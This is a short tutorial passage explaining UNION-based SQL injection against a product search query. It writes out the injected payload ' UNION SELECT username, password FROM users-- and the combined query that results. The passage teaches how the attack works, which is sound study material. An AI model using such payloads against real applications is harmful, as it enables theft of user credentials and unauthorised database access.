
---
### SQLi Example — Retrieving Data from Other Database Tables

Suppose an application searches products:

```
SELECT name, description
FROM products
WHERE category = 'Gifts';
```

The attacker discovers that the input is injectable and uses a **UNION-based SQL injection** to append another query:

```
' UNION SELECT username, password FROM users--
```

The resulting query is conceptually:

```
SELECT name, description
FROM products
WHERE category = 'Gifts'
UNION
SELECT username, password
FROM users--';
```

The first query retrieves product information, while the injected `UNION SELECT` retrieves data from the `users` table.

If the application displays the query results, the attacker may see usernames and passwords alongside the legitimate product data.

**Impact:** SQL injection can allow an attacker to access sensitive information belonging to **other database tables** that the application's intended functionality does not expose.